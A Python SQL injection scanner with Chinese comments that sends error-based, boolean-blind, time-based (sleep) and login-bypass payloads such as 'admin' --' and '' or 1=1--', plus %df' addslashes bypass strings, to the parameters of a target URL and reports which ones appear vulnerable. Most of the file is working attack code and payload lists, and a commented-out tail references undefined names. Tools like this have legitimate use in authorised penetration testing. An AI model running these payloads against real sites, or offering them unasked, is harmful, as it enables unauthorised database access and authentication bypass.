#!/usr/bin/python3
import difflib 
import http.client
import itertools
import optparse
import random,re,os
import urllib, urllib.parse, urllib.request  # Python 3 required
import logging
import argparse
import coloredlogs
logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')#使用接受的指定日期/时间格式time.strftime()
logger = logging.getLogger("sql_injection_scanner")#这个name实际上是层级化的，如果使用__name__那么，似乎和python包的结构一样
coloredlogs.install(
    logger=logger,#只选择从本文件以及本库中传出的log，将库中的忽略
    fmt='%(asctime)s %(levelname)s - %(message)s',#自定义输出格式
    level=logging.INFO
)

DEBUG = 0
LOG_DEBUG = 0

NAME, VERSION, AUTHOR, LICENSE = "My SQLi Scanner :)", "1.0", "99hans & ws_0407 & xxrw", "Public domain (FREE)"
time_times = 1
bool_times = 1
passwd_times = 1
b_add_times = 1
MYTIME = 5
START = -1
PREFIXES, SUFFIXES = (" ", ") ", "' ", "') "), ("", "-- -", "#", "%%16")            # prefix/suffix values used for building testing blind payloads 盲注前后缀
TAMPER_SQL_CHAR_POOL = ('(', ')', '\'', '"',"1' or 1=1")                            # characters used for SQL tampering/poisoning of parameter values;篡改/毒化
BOOLEAN_TESTS = ("AND %d=%d", "OR NOT (%d>%d)")                                     # boolean tests used for building testing blind payloads 布尔型盲注
COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer"                             # optional HTTP header names
GET, POST = "GET", "POST"                                                           # enumerator-like values used for marking current phase
TEXT, HTTPCODE, TITLE, HTML = range(4)                                              # enumerator-like values used for marking content type
FUZZY_THRESHOLD = 0.95                                                              # ratio value in range (0,1) used for distinguishing True from False responses 模糊阈，达到即认为有漏洞
TIMEOUT = 30                                                                        # connection timeout in seconds
RANDINT = random.randint(1, 255)                                                    # random integer value used across all tests
BLOCKED_IP_REGEX = r"(?i)(\A|\b)IP\b.*\b(banned|blocked|bl(a|o)ck\s?list|firewall)" # regular expression used for recognition of generic firewall blocking messages #如果被waf防住了

DBMS_ERRORS = {                                                                     # regular expressions used for DBMS recognition based on error message response 通过各种数据库报错而得到的对数据库的判断
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}


TIME_TEST_GET = [
    "\' and sleep(%s)--+" % MYTIME,
    "\" and sleep(%s)--+" % MYTIME,
    "\') and sleep(%s)=" % MYTIME,
    "\") and sleep(%s)=" % MYTIME,
    "\')) and sleep(%s)=\'" % MYTIME,
    "\")) and sleep(%s)=\"" % MYTIME,
    "\' and sleep(%s)=" % MYTIME,
    "\" and sleep(%s)=" % MYTIME,
    "\' or sleep(%s)--+" % MYTIME,
    "\" or sleep(%s)--+" % MYTIME,
    "\') or sleep(%s)--+" % MYTIME,
    "\") or sleep(%s)--+" % MYTIME,
    "\')) or sleep(%s)=\'" % MYTIME,
    "\")) or sleep(%s)=\"" % MYTIME,
    "\' or sleep(%s)=" % MYTIME,
    "\" or sleep(%s)=" % MYTIME
]


TIME_TEST_POST = [
    "\' and sleep(%s)#" % MYTIME,
    "\" and sleep(%s)#" % MYTIME,
    "\') and sleep(%s)#" % MYTIME,
    "\") and sleep(%s)#" % MYTIME,
    "\')) and sleep(%s)=\'" % MYTIME,
    "\")) and sleep(%s)=\"" % MYTIME,
    "\' or sleep(%s)#" % MYTIME,
    "\" or sleep(%s)#" % MYTIME,
    "\') or sleep(%s)#" % MYTIME,
    "\") or sleep(%s)#" % MYTIME,
    "\')) or sleep(%s)=\'" % MYTIME,
    "\")) or sleep(%s)=\"" % MYTIME,
    "\' or sleep(%s)=" % MYTIME,
    "\" or sleep(%s)=" % MYTIME,
]

PASSWD_TEST = [
    "admin' --",
    "admin' #",
    "admin'/*",
    "admin\" --",
    "admin\" #",
    "admin\"/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "\" or 1=1--",
    "\" or 1=1#",
    "\" or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "\") or '1'='1--",
    "\") or ('1'='1--",
    "�' or 1#"
]

BYPASS_ADDSLASHES = [
    "%df'",
    "%df' or 1",
    "�'",
    "�' or 1"
]

def send_data(url, data=None):
    retval = {HTTPCODE: http.client.OK}
    try:
        A = "".join(url[_].replace(' ', "%20") if _ > url.find('?') else url[_] for _ in range(len(url))) 
        B = data
        if B != None:
            B = B.encode('utf-8')
        C = globals().get("_headers", {})
        req = urllib.request.Request(A, B, C)
        retval[HTML] = urllib.request.urlopen(req, timeout=TIMEOUT).read()
    except Exception as ex:
        logging.warning("[!]Exception!!!")
        retval[HTTPCODE] = getattr(ex, "code", None)
        retval[HTML] = ex.read() if hasattr(ex, "read") else str(ex.args[-1])
        logging.warning(retval[HTTPCODE])
        logging.warning(retval[HTML])
    
    retval[HTML] = (retval[HTML].decode("utf8", "ignore") if hasattr(retval[HTML], "decode") else "") or ""
    if re.search(BLOCKED_IP_REGEX, retval[HTML]) != None:
        logging.error("[!]It has WAF!!")
    retval[HTML] = "" if re.search(BLOCKED_IP_REGEX, retval[HTML]) else retval[HTML] #判断是否有防火墙
    retval[HTML] = re.sub(r"(?i)[^>]*(AND|OR)[^<]*%d[^<]*" % RANDINT, "__REFLECTED__", retval[HTML])
    match = re.search(r"<title>(?P<result>[^<]+)</title>", retval[HTML], re.I)#re.I 忽略匹配大小写
    retval[TITLE] = match.group("result") if match and "result" in match.groupdict() else None # 如果group字典中有key=result的，那么就返回所有key=result的value
    retval[TEXT] = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", retval[HTML])
    #print(retval[HTML])
    #print(retval[TITLE])
    #print(retval[TEXT])
    #os.system('pause')
    return retval


def scan_page(url, data=None):
    global START
    global time_times
    global bool_times
    global passwd_times
    global b_add_times
    retval, usable = False, False
    #初始化url和data
    url = re.sub(r"=(&|\Z)", "=1\g<1>", url) if url else url 
    data = re.sub(r"=(&|\Z)", "=1\g<1>", data) if data else data
    try:
        for phase in (GET, POST):
            original, current = None, url if phase is GET else (data or "")
            for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", current):
                vulnerable,usable = False, True 
                print("* scanning %s parameter '%s'" % (phase, match.group("parameter")))
                if LOG_DEBUG == 1:
                    logging.info("[!]Begin DB_Error")
                if DEBUG == 1:
                    print("[+]The first send: %s" % current)
                original = original or (send_data(current, data) if phase is GET else send_data(url, current))
                A = "".join(random.sample(TAMPER_SQL_CHAR_POOL, len(TAMPER_SQL_CHAR_POOL)))
                B = "%s%s" % (match.group(0),urllib.parse.quote(A))
                tampered = current.replace(match.group(0), B)
                if DEBUG == 1:
                    print("[+]The second send: %s and tail is : %s" % (tampered,A))
                content = send_data(tampered, data) if phase is GET else send_data(url, tampered)

                for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
                    if not vulnerable and re.search(regex, content[HTML], re.I) and not re.search(regex, original[HTML], re.I):
                        print(" (i) %s parameter '%s' appears to be error SQLi vulnerable (%s)" % (phase, match.group("parameter"), dbms))
                        retval = vulnerable = True
                if LOG_DEBUG == 1:
                    logging.info("[!]DB_Error Down")
                
                if phase == "POST":
                    if LOG_DEBUG == 1:
                        logging.info("[!]Begin Universal password")
                    if DEBUG == 1:
                        print("[+]The first passwd send: %s" % current)
                    original = send_data(url,current)
                    for passwd_test in PASSWD_TEST:
                        A = "".join(passwd_test)
                        B = "%s%s" % (match.group(0),urllib.parse.quote(A))
                        tampered = current.replace(match.group(0), B)
                        if DEBUG == 1:
                            print("[+]The %d passwd send: %s and tail is : %s" % (passwd_times,tampered,A))
                        passwd_times += 1
                        content = send_data(url, tampered)
                        if ("suc" in content[HTML]) or ("flag" in content[HTML]) or ("SUC" in content[HTML]) or ("Suc" in content[HTML]):
                            B = "%s%s" % (match.group(0),A)
                            tampered = current.replace(match.group(0), B)
                            print("(i) %s parameter '%s' appears to be Universal password SQLi vulnerable.(e.g. %s)" % (phase,match.group("parameter"),tampered))
                            retval = True
                            #print(content[HTML])
                            break
                    if LOG_DEBUG == 1:
                        logging.info("[!]Universal password Down")
                if LOG_DEBUG == 1:
                    logging.info("[!]Begin bypass AddSlashes")
                vulnerable =  False 
                i = 0
                if DEBUG == 1:
                    print("[+]The first bypass_addslashes send: %s" % current)
                original = original or (send_data(current, data) if phase is GET else send_data(url, current))
                for b_a in BYPASS_ADDSLASHES:
                    A = "".join(b_a)
                    if phase is GET:
                        if "%df" in A:
                            B = "%s%s" % (match.group(0),A)
                        else:
                            B = "%s%s" % (match.group(0),urllib.parse.quote(A))
                    if phase is POST:
                        B = "%s%s" % (match.group(0),A)
                    tampered = current.replace(match.group(0), B)
                    if DEBUG == 1:
                        print("[+]The %d bypass_addslashes send: %s and tail is : %s" % (b_add_times,tampered,A))
                    b_add_times += 1
                    content = send_data(tampered, data) if phase is GET else send_data(url, tampered)

                    for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
                        if not vulnerable and re.search(regex, content[HTML], re.I) and not re.search(regex, original[HTML], re.I):
                            print(" (i) %s parameter '%s' appears to be error SQLi vulnerable (%s)" % (phase, match.group("parameter"), dbms))
                            retval = vulnerable = True
                            i = 1
                    if i == 1:
                        break
                #os.system("pause")
                if LOG_DEBUG == 1:
                    logging.info("[!]Bypass AddSlashes Down")

                if LOG_DEBUG == 1:
                    logging.info("[!]Begin Time")
                key = 1
                if phase is GET:
                    for time_test in TIME_TEST_GET:
                        Time = {HTTPCODE: http.client.OK}
                        try:
                            myurl = url
                            myurl += time_test
                            A = "".join(myurl[_].replace(' ', "%20") if _ > myurl.find('?') else myurl[_] for _ in range(len(myurl))) 
                            B = globals().get("_headers", {})
                            if DEBUG == 1:
                                print("[+]The %d time_test send: %s" % (time_times,A))
                            time_times += 1
                            #print(B)
                            req = urllib.request.Request(A, None, B)
                            Time[HTML] = urllib.request.urlopen(req, timeout=MYTIME-1).read()
                        except Exception as ex:
                            if LOG_DEBUG == 1:
                                logging.warning('[!]Get Time Exception')
                            Time[HTTPCODE] = getattr(ex, "code", None)
                            Time[HTML] = ex.read() if hasattr(ex, "read") else str(ex.args[-1])
                            if LOG_DEBUG == 1:
                                logging.warning(Time[HTTPCODE])
                            if LOG_DEBUG == 1:
                                logging.warning(Time[HTML])
                            if 'time' in Time[HTML]:
                                print(" (i) %s parameter '%s' appears to be Time-blind SQLi vulnerable (e.g. %s)" % (phase, match.group("parameter"),myurl))
                                retval = True
                                break
                else:
                    for time_test in TIME_TEST_POST:
                        Time = {HTTPCODE: http.client.OK}
                        try:
                            A = "".join(url[_].replace(' ', "%20") if _ > url.find('?') else url[_] for _ in range(len(url))) 
                            if key == 1:
                                START = current.find("&",START+1)
                                key = 0
                            if START != -1:
                                data = current[0:START] + time_test + current[START:]
                            else:
                                data = current + time_test
                            B = data.encode('utf-8')
                            C = globals().get("_headers", {})
                            if DEBUG == 1:
                                print("[+]The %d time_test send: %s" % (time_times,B))
                            time_times += 1
                            req = urllib.request.Request(A, B, C)
                            Time[HTML] = urllib.request.urlopen(req, timeout=MYTIME-1).read()
                        except Exception as ex:
                            if LOG_DEBUG == 1:
                                logging.warning('[!]Post Time Exception')
                            Time[HTTPCODE] = getattr(ex, "code", None)
                            Time[HTML] = ex.read() if hasattr(ex, "read") else str(ex.args[-1])
                            if LOG_DEBUG == 1:
                                logging.warning(Time[HTTPCODE])
                            if LOG_DEBUG == 1:
                                logging.warning(Time[HTML])
                            if 'time' in Time[HTML]:
                                print(" (i) %s parameter '%s' appears to be Time-blind SQLi vulnerable " % (phase, match.group("parameter")))
                                retval = True
                                break
                if LOG_DEBUG == 1:
                    logging.info("[!]Time Down")

                if LOG_DEBUG == 1:
                    logging.info("[!]Begin Bool")
                vulnerable = False 
                for prefix, boolean, suffix, inline_comment in itertools.product(PREFIXES, BOOLEAN_TESTS, SUFFIXES, (False, True)): #需要试128次，所以布尔盲注比较费时间
                    if not vulnerable:
                        template = ("%s%s%s" % (prefix, boolean, suffix)).replace(" " if inline_comment else "/**/", "/**/")# 用/**/替代" "或者/**/
                        payloads = dict((_, current.replace(match.group(0), "%s%s" % (match.group(0), urllib.parse.quote(template % (RANDINT if _ else RANDINT + 1, RANDINT), safe='%')))) for _ in (True, False))#生成字典； 有true false两种情况； 将match group的地方用match group + template进行替代
                        if DEBUG == 1:
                            print("[+]The %d bool_test send: %s" % (bool_times,payloads[True]))
                        bool_times += 1
                        if DEBUG == 1:
                            print("[+]The %d bool_test send: %s" % (bool_times,payloads[False]))
                        bool_times += 1
                        contents = dict((_, send_data(payloads[_], data) if phase is GET else send_data(url, payloads[_])) for _ in (False, True))
                        #从payloads取出内容
                        #有一个True和False的键；
                        #如果元组中的这三个元素都存在
                        if all(_[HTTPCODE] and _[HTTPCODE] < http.client.INTERNAL_SERVER_ERROR for _ in (original, contents[True], contents[False])):# all 函数用来判断给定的可迭代参数 iterable 中的所有元素是否都为 TRUE
                            #那么进行这个判断
                            #就是sql语句正确就和正确的url是一样的
                            #如果sql语句是错误的那么就啥都不显示
                            if any(original[_] == contents[True][_] != contents[False][_] for _ in (HTTPCODE, TITLE)):
                                vulnerable = True #如果有任何一个满足这个条件
                            else:#如果不匹配的另一种算法
                                ratios = dict((_, difflib.SequenceMatcher(None, original[TEXT], contents[_][TEXT]).quick_ratio()) for _ in (False, True))#difflib计算差异辅助工具 # contents[][]?s
                                vulnerable = all(ratios.values()) and min(ratios.values()) < FUZZY_THRESHOLD < max(ratios.values()) and abs(ratios[True] - ratios[False]) > FUZZY_THRESHOLD / 10
                        if vulnerable:####布尔型也就是盲注形态
                            print(" (i) %s parameter '%s' appears to be Bool-blind SQLi vulnerable (e.g.: '%s')" % (phase, match.group("parameter"), payloads[True]))
                            retval = True
                if LOG_DEBUG == 1:
                    logging.info("[!]Bool Down")
      
        if not usable:
            print(" (x) no usable GET/POST parameters found")
    except KeyboardInterrupt:
        print("\r (x) Ctrl-C pressed")
    return retval

def init_options(proxy=None, cookie=None, ua=None, referer=None):
    globals()["_headers"] = dict(filter(lambda _: _[1], ((COOKIE, cookie), (UA, ua or NAME), (REFERER, referer))))
    urllib.request.install_opener(urllib.request.build_opener(urllib.request.ProxyHandler({'http': proxy})) if proxy else None)

def mysql(arg_list=None):
    parser = optparse.OptionParser(version=VERSION)
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
    parser.add_option("-d","--data", dest="data", help="POST data (e.g. \"query=test\")")
    parser.add_option("-c","--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("-a","--user-agent", dest="ua", help="HTTP User-Agent header value")
    parser.add_option("-r","--referer", dest="referer", help="HTTP Referer header value")
    parser.add_option("-p","--proxy", dest="proxy", help="HTTP proxy address (e.g. \"http://127.0.0.1:1080\")")
    options, _ = parser.parse_args(arg_list)
    #print("Success!!!!!")
    #os.system('pause')

    if options.url:
        if DEBUG == 1:
            logging.info("[!]Start scanning :)")
            print("[+]Url = %s" % options.url)
            print("[+]Proxy = %s" % options.proxy)
            print("[+]Cookie = %s" % options.cookie)
            print("[+]User-Agent = %s" % options.ua)
            print("[+]Referer = %s" % options.referer)
        init_options(options.proxy, options.cookie, options.ua, options.referer)
        result = scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url, options.data)
        print("\nscan results: %s vulnerabilities found" % ("possible" if result else "no"))
    else:
        parser.print_help()

'''
if __name__ == "__main__":
    print("%s cc-v%s" % (NAME,VERSION))
    print("By %s \n" % AUTHOR)
    USAGE = '[+]Please input option: [your option]'
    parser = optparse.OptionParser(version=VERSION,usage=USAGE)
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
    parser.add_option("--data", dest="data", help="POST data (e.g. \"query=test\")")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("--user-agent", dest="ua", help="HTTP User-Agent header value")
    parser.add_option("--referer", dest="referer", help="HTTP Referer header value")
    parser.add_option("--proxy", dest="proxy", help="HTTP proxy address (e.g. \"http://127.0.0.1:8080\")")
    (options,args) = parser.parse_args()

    try:
        while(True):
            _ = input("[+]Please input option: ")
            if _ not in '-h' and _ not in '--version': 
                args_list = _.split(" ")
                (options,args) = parser.parse_args(args_list)
            elif _ in '--version':
                parser.print_version()
                continue
            elif _ in '-h':
                parser.print_help()
                continue

            if options.url:
                init_options(options.proxy, options.cookie, options.ua, options.referer) #global()['_header'] && 设置代理客户端
                result = scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url, options.data)# 判断是否有http;若没有则自行增加
                print("scan results: %s vulnerabilities found" % ("possible" if result else "no"))
            else:
                parser.print_help()
    except KeyboardInterrupt:
        print("\r (x) Ctrl-C pressed")


                                                                                                                           #该接收两个参数，第一个为函数，第二个为序列，序列的每个元素作为参数传递给函数进行判，然后返回 True 或 False，最后将返回 True 的元素放到新列表中。
parser = argparse.ArgumentParser(
    epilog=templatesSection,#额外描述？
    description=__doc__,
    formatter_class=argparse.RawTextHelpFormatter
)

parser.add_argument("-d", "--data", metavar="postData", dest="data", help="POST data (e.g. \"query=test\")", type=valid_postData)
parser.add_argument("--cookies", metavar="omnomnom", nargs=1, dest="cookie", help="HTTP Cookie header value" , type=valid_postData)
parser.add_argument("-U", "--user-agent", metavar="useragent", nargs=1, dest="ua", help="HTTP User-Agent header value", type=str, default=[requests.utils.default_user_agent()])
parser.add_argument("--referer", metavar="referer",dest="referer", help="HTTP Referer header value")
parser.add_argument("--proxy", metavar="proxyUrl", dest="proxy", help="Proxy information.HTTP proxy address (Example: --proxy \"user:password@proxy.host:8080\"(e.g. \"http://127.0.0.1:8080\")", type=valid_proxyString)


requiredNamedArgs = parser.add_argument_group('Required named arguments')
requiredNamedArgs.add_argument("-u", "--url",  metavar="target",  dest="url", required=True, help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")",  type=valid_url)
try:
    while(True):
        _ = input("please input your options...")
        #if _ not in xxxx 已经定义好的参数---这个之后再写
        if _ not in '-h' and _ not in '--version':# 在输入url前理所应当地应该输入一些参数（似乎会先加到参数队列中，以便之后输入）;尤其是那个data； 
            args_list=_.split(" ")
            (options, args) = parser.parse_args(args_list)
        else:
            (options,args)=parser.parse_args()
        if options.url:
            init_options(options.proxy, options.cookie, options.ua, options.referer) # 初始化选项；这个应该就是那个_header的global
            result = scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url, options.data)# 判断是否有http;若没有则自行增加
            print("\nscan results: %s vulnerabilities found" % ("possible" if result else "no"))
        elif  _ in '--version':
            parser.print_version()
        else:
            parser.print_help()
except KeyboardInterrupt:
    print("\r (x) Ctrl-C pressed")

'''